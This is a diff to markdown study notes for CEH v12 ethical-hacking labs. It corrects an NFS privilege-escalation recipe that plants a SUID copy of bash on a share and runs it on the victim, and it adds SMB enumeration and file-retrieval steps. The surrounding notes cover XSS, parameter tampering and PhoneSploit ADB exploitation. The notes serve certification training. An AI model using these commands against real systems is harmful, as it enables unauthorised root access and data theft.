@@ -188,7 +188,7 @@ OpenVAS, Nessus, Nikto
 - Install **nfs-common**
 - List shares: ```showmount -e [TARGET_IP]``` or ```nmap -sV --script=nfs-showmount [TARGET_IP]```
 - Mount: ```mount -t nfs [TARGET_IP]:/[SHARED_FOLDER] /tmp/share```
-- Copy bash: ```cp /bin/bash /tmp/share && chmod +x /tmp/share/bash```
+- Copy bash: ```cp /bin/bash /tmp/share && chmod +s /tmp/share/bash```
 - Go to victim (via ssh for example) and execute ```bash -p``` on the [SHARED_FOLDER]
 
 ### Lab2-Task5: Escalate privileges by bypassing UAC and exploiting sticky keys (Page 135)
@@ -353,7 +353,7 @@ OpenVAS, Nessus, Nikto
 
 ### Lab2-Task4: Exploit Parameter Tampering and XSS Vulnerabilities in Web Applications (Page 407)
 
-- Log in a website, change the parameter value (id )in the URL
+- Log in a website, change the parameter value (id) in the URL
 - Conduct a XSS attack: Submit script codes via text area
 
 ### Lab2-Task6: Enumerate and Hack a Web Application using WPScan and Metasploit (Page 431)
@@ -449,6 +449,7 @@ https://www.scribd.com/document/662376180/CEH-v12-LabManual-p04
 ## Module 17: Hacking Mobile Platforms
 
 ### Lab 1-Task 4: Exploit the Android Platform through ADB using PhoneSploit (Page 229)
+
 - ADB port: TCP/5555
 - cd Phonesploit
 - python3 -m pip install colorama
@@ -510,6 +511,8 @@ https://www.scribd.com/document/662376180/CEH-v12-LabManual-p04
   - smbclient \\ip\\sharename
   - nmap -p 445 -sV –script smb-enum-services [IP]
   - Metasploit: **auxiliary/scanner/smb/smb_login**
+  - Metasploit: **auxiliary/scanner/smb/smb_enum**
+  - smbget to obtain files
   
 - **WPScan**
 
